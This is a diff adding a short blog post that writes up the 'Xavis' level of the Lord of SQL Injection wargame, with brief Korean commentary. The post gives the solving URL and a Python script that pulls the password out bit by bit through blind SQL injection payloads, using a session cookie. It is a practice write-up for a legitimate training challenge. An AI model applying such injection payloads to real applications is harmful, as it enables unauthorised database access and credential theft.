@@ -1,0 +1,48 @@
+---
+layout: post
+title: LOS Xavis 
+date: 2015-08-16 23:09:00 +0900
+category: Hacking 
+---
+http://los.sandbox.cash/chall/xavis_a395c4d30bdb092b6f835ee7b4821aa3.php?pw=%ED%95%B4%EC%BB%A4%EB%8B%A4
+
+키값이 한글 아오
+
+한글자씩 비교해서 추출했다 ㅋㅋㅋㅋㅋㅋㅋㅋ손으로
+
+
+예전엔 손으로 풀었지만 역시나 진우꺼 소스 가져오는게 가장 편하다.
+
+
+
+```
+import requests
+ 
+ 
+ 
+key=""
+site=""
+q=0
+w=1
+header={'Cookie':'PHPSESSID=dtf9l8uj2aq5m3orv1ddmg97k7'}
+for j in range(1,4):
+        for i in reversed(range(1,17)):
+                site="http://los.sandbox.cash/chall/xavis_a395c4d30bdb092b6f835ee7b4821aa3.php?pw=%27||id='admin'%26%26"
+                site+="substr(bin(ord(mid(pw,"+str(j)+",1))),"+str(i)+",1)%23"
+                print (site)
+                r=requests.put(site,headers=header)
+                
+                if "<br><h2>Hello admin" in r.text:
+                  q+=w
+                w=w*2
+        key=key+str(q)+"   "
+        print ("\nkey"+key+"\n")
+        q=0
+        w=1
+                
+
+
+```
+출처 : http://unknown84.tistory.com/23
+
+
